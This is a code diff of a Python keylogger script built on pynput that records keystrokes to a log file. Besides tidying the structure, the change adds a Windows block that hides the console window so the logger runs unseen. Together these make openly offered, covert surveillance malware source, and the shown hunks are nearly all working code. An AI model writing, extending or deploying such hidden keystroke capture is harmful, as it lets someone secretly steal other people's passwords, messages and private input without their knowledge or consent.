@@ -1,16 +1,12 @@
-from pynput import keyboard
-import logging
+import os
+import sys
 import argparse
+import logging
+from pynput import keyboard
 
-def setup_logging(log_file):
-    """
-    Configure logging to write to a file.
-    """
-    logging.basicConfig(
-        filename=log_file,
-        level=logging.DEBUG,
-        format="%(asctime)s: %(message)s"
-    )
+if os.name == 'nt':
+    import ctypes
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def on_press(key):
     """
@@ -34,15 +30,22 @@ def start_keylogger(log_file):
     """
     Start the keylogger
     """
-    setup_logging(log_file)
+    logging.basicConfig(
+        filename=log_file,
+        level=logging.DEBUG,
+        format="%(asctime)s: %(message)s"
+    )
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         try:
             listener.join()
         except Exception as e:
             logging.error(f"Error: {e}")
 
-if __name__ == "__main__":
+def main():
     parser = argparse.ArgumentParser(description="Simple keylogger")
-    parser.add_argument("--log-file", type=str, default="keylog.txt", help="Log file name")
+    parser.add_argument("--log-file", required=True, help="Path to the log file")
     args = parser.parse_args()
     start_keylogger(args.log_file)
+
+if __name__ == "__main__":
+    main()
